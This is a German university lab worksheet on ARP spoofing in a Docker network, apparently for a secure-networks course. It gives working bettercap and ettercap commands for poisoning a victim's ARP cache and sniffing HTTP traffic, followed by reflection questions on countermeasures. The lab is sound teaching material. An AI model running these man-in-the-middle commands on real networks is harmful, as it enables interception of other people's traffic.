# lab02 – ARP Spoofing: Wer sitzt in deinem Netz?

| | |
|---|---|
| **Modul** | Sichere Netzwerke |
| **Hochschule** | FOM Hochschule für Oekonomie & Management |
| **Semester** | Sommersemester 2026 |
| **Dauer** | ca. 90 Minuten |
| **Voraussetzungen** | Docker Desktop installiert, Linux-Grundkenntnisse, lab01 abgeschlossen |

---

> **Hinweis:** Die IP-Adressen werden von Docker beim Start dynamisch vergeben.
> Die konkreten Adressen zeigt `./setup.sh` am Ende an (auch in `.lab-ips` gespeichert).

## Lernziele

Nach diesem Lab kannst du...

1. erklären, warum ARP als Protokoll keine Möglichkeit hat, Absender zu authentifizieren
2. beschreiben, wie ein Angreifer im gleichen Netz den ARP-Cache eines anderen Hosts manipuliert
3. nachvollziehen, wie unverschlüsselter Traffic als zwischengeschalteter Knoten mitgelesen werden kann
4. begründen, warum das Opfer einen solchen Angriff nicht unmittelbar bemerkt
5. geeignete Gegenmaßnahmen auf Netzwerkebene benennen und einordnen

---

## Das Szenario

Du arbeitest mit drei Containern. Ein **Opfer** kommuniziert regelmäßig mit einem **Webserver** im gleichen Netz. Ein **Angreifer** befindet sich ebenfalls in diesem Netz – und hat die Möglichkeit, sich zwischen beide zu drängen, ohne dass dafür ein Kabel umgesteckt werden muss.

> **Leitfrage:** Wenn zwei Geräte im gleichen Netz kommunizieren – wie stellt man sicher, dass ein Paket wirklich beim richtigen Empfänger ankommt?

---

## Topologie

```
  ┌─────────────────┐       ┌──────────────────┐       ┌─────────────────┐
  │      alice      │       │     mallory      │       │     gateway     │
  │ <IP von alice>  │       │ <IP von mallory>   │       │ <IP von gateway>   │
  │    (Opfer)      │       │   (Angreifer)    │       │  (Webserver)    │
  └─────────────────┘       └──────────────────┘       └─────────────────┘

         Alle drei Container im selben Netz: <Subnetz – siehe setup.sh-Ausgabe>
                       Docker Bridge (lab-net)
```

| Container | Image | IP | Rolle |
|---|---|---|---|
| `alice` | `ubuntu:22.04` | `<IP von alice>` | Sendet HTTP-Anfragen an gateway |
| `mallory` | `kalilinux/kali-rolling` | `<IP von mallory>` | Angreifer im gleichen Segment |
| `gateway` | `alpine:latest` | `<IP von gateway>` | HTTP-Webserver (Port 80) |

---

## Aufgaben

### Schritt 1 – Lab starten

```bash
chmod +x setup.sh teardown.sh
./setup.sh
```

Das Skript startet alle Container und installiert die benötigten Tools.
Warte bis `Lab ist bereit!` erscheint.

```bash
docker ps
# Erwartung: 3 Container (alice, gateway, mallory) mit Status "Up"
```

---

### Schritt 2 – Drei Terminals öffnen

```bash
# Terminal A – alice (Opfer)
docker exec -it alice bash

# Terminal B – mallory (Angreifer)
docker exec -it mallory bash

# Terminal C – gateway (Webserver)
docker exec -it gateway sh
```

---

### Schritt 3 – Netzwerk erkunden

Führe auf **alice** (Terminal A) aus:

```bash
# ARP-Cache anzeigen – welche MAC-Adressen sind bekannt?
arp -n

# Erreichbarkeit des Gateways testen
ping -c 3 <IP von gateway>
```

Notiere die MAC-Adresse, die für `<IP von gateway>` eingetragen ist:

```
MAC-Adresse von <IP von gateway> (vor Angriff): _______________________________
```

> **Frage:** Zu welchem Container gehört diese MAC-Adresse?
> Überprüfe es:
> ```bash
> docker exec gateway ip link show eth0
> docker exec mallory ip link show eth0
> ```

---

### Schritt 4 – HTTP-Traffic beobachten

alice sendet bereits automatisch alle 5 Sekunden Anfragen ans Gateway.
Überzeuge dich davon:

```bash
# Auf alice (Terminal A):
curl -s http://<IP von gateway>/
```

Du siehst die Antwort des Webservers. Merke dir, welche Informationen darin enthalten sind.

---

### Schritt 5 – Angriff starten: bettercap

Wechsle zu **Terminal B (mallory)**:

```bash
bettercap -iface eth0
```

In der bettercap-Konsole:

```
net.probe on
net.show
```

> **Frage:** Welche Hosts werden gefunden? Was siehst du in der Ausgabe?

Starte den Angriff:

```
set arp.spoof.targets <IP von alice>
set arp.spoof.fullduplex true
arp.spoof on

set net.sniff.verbose true
net.sniff on
```

Warte ca. 15 Sekunden.

---

### Schritt 6 – Merkt alice etwas?

Öffne ein **viertes Terminal** und prüfe den ARP-Cache von alice:

```bash
docker exec alice arp -n
```

Notiere die MAC-Adresse, die jetzt für `<IP von gateway>` eingetragen ist:

```
MAC-Adresse von <IP von gateway> (nach Angriff): _______________________________
```

> **Beobachte:** Hat sich etwas verändert? Vergleiche mit deiner Notiz aus Schritt 3.

Prüfe gleichzeitig, ob alice weiterhin Antworten bekommt:

```bash
docker exec alice curl -s http://<IP von gateway>/
```

**Was fällt auf?**

```
_______________________________________________
_______________________________________________
```

---

### Schritt 7 – Traffic auf mallory beobachten

Beobachte die `net.sniff`-Ausgabe in Terminal B ca. 30 Sekunden lang.

> **Beobachte:**
> - Was siehst du im Mitschnitt?
> - Welche Informationen aus der HTTP-Kommunikation sind lesbar?

**Notiere deine Beobachtungen:**

```
_______________________________________________
_______________________________________________
_______________________________________________
```

Beobachte parallel die ARP-Ebene auf alice:

```bash
# Viertes Terminal – auf alice:
docker exec alice tcpdump -i eth0 -n arp
```

> **Frage:** Wer sendet ARP-Pakete? Was behaupten diese Pakete?

---

### Schritt 8 – Angriff stoppen

In Terminal B (bettercap-Konsole):

```
arp.spoof off
net.sniff off
exit
```

Warte ca. 30 Sekunden. Prüfe erneut den ARP-Cache von alice:

```bash
docker exec alice arp -n
```

**Was beobachtest du?**

```
_______________________________________________
```

---

### Schritt 9 – Wiederholung mit ettercap

```bash
# Auf mallory (Terminal B):
ettercap -T -i eth0 -M arp:remote /<IP von alice>// /<IP von gateway>//
```

Beende ettercap mit `Ctrl+Q`.

> **Vergleich:** Was zeigt ettercap anders als bettercap?

---

### Schritt 10 – Cleanup

```bash
./teardown.sh

# Prüfen:
docker ps
```

---

## Reflexionsfragen

**F1 – Was hast du beobachtet?**
Beschreibe in eigenen Worten, was mallory während des Angriffs sehen konnte.

**F2 – Warum funktioniert das?**
Erkläre, warum alice seinen Traffic an mallory schickt – obwohl alice eigentlich gateway erreichen möchte.

**F3 – Welche Rolle spielt `ip_forward`?**
Was würde passieren, wenn diese Einstellung auf mallory nicht aktiv wäre?
Warum ist das für den Angriff entscheidend?

**F4 – Hat alice etwas bemerkt?**
Was sagt dir das über reale Angreiferszenarien in Büro- oder Campusnetzen?

**F5 – Wie nennt sich dieser Angriff?**
Recherchiere den Fachbegriff für diese Art der Manipulation.
Welcher übergeordnete Angriffstyp (aus lab01 bekannt) wird damit realisiert?

**F6 – Schutzmaßnahmen**
Nenne mindestens drei technische Maßnahmen, die diesen Angriff verhindern oder erschweren.
Auf welcher OSI-Schicht wirkt jeweils welche Maßnahme?

---

## Quick Reference

| Befehl | Beschreibung | Container |
|---|---|---|
| `arp -n` | ARP-Cache anzeigen | alice |
| `ip link show eth0` | MAC-Adresse anzeigen | alle |
| `ping -c 3 <ip>` | Erreichbarkeit testen | alle |
| `curl -s http://<IP von gateway>/` | HTTP-Anfrage senden | alice |
| `tcpdump -i eth0 -n arp` | ARP-Pakete mitschneiden | alice |
| `bettercap -iface eth0` | bettercap starten | mallory |
| `ettercap -T -i eth0 -M arp:remote /IP1// /IP2//` | ettercap MitM | mallory |
| `./setup.sh` | Lab starten | Host |
| `./teardown.sh` | Lab beenden | Host |
| `docker exec -it <n> bash` | In Container einloggen | Host |